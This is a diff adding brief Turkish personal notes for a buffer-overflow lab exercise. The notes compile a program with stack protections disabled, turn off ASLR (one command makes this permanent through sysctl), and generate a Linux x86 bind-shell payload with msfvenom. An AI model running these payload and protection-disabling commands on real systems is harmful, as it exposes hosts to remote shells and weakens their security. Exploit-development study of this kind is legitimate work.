@@ -1,0 +1,26 @@
+gcc -g fury.c -o furyb
+32 bit ve bu kod ile derle yoksa bof çalışmıyor amk 5 saattir uğraşıyorum bu kod yüzünden amk
+gcc -g fury.c -o fury -m32 -fno-stack-protector -z execstack -no-pie
+
+ile derle -g ile gdb de kodların çıkmasını sağlıyorsun işte aq
+
+-------- rastgele bellek erişimini kapat ki bof çalışsın------
+ayrıca 
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+kodunu işin bitince kalide
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+yap
+kalıcı olarak kapatmak için
+echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf
+yap
+
+-------- rastgele bellek erişimini kapat ki bof çalışsın------
+
+
+
+
+
+payloadı şu komutla oluştur
+msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
+yani
+msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed lhost=192.168.1.10 lport=4444 -f python
